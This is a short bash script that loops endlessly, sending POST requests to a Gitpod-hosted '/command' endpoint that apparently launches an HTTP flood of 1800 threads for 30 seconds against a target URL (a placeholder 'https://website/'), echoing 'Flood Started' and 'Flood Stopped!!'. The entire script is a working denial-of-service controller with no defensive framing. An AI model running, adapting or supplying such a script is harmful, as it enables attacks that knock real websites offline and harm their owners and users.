process=1
ulimit -n 999999

while true
do
    echo Flood Started
    for ((i=1;i<=$process;i++))
    do
        curl -X POST -d "url=https://website/&threads=1800&timer=30" https://8080-jdpst224-testergolang-ya977y75535.ws-us116.gitpod.io/command
        sleep 0.1
    done
    sleep 15
    echo Flood Stopped!!
done
